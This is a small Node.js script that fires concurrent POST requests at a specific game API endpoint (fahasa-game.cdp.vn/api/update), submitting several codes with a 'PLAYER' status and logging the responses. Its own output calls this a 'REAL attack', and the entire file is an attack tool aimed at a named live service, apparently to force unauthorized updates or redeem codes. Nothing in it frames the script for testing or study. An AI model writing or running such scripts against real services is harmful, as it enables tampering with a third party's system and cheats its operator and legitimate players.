const axios = require('axios');

const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
const CODES = ['ABC24', 'ABC25', 'ABC110'];

async function attack() {
    console.log(`🚀 Starting REAL attack on ${TARGET_URL} with codes: ${CODES.join(', ')}`);
    
    const requests = CODES.map(code => {
        return axios.post(TARGET_URL, {
            code: code,
            status: 'PLAYER'
        }).then(res => ({
            code,
            status: res.status,
            data: res.data
        })).catch(err => ({
            code,
            status: err.response?.status || 'network_error',
            error: err.response?.data || err.message
        }));
    });

    const results = await Promise.all(requests);
    
    console.log('📊 Attack Results:');
    results.forEach(r => {
        console.log(`[${r.code}] Status: ${r.status}`);
        if (r.data) console.log(`   Success Data:`, JSON.stringify(r.data));
        if (r.error) console.log(`   Error:`, JSON.stringify(r.error));
    });
}

attack();
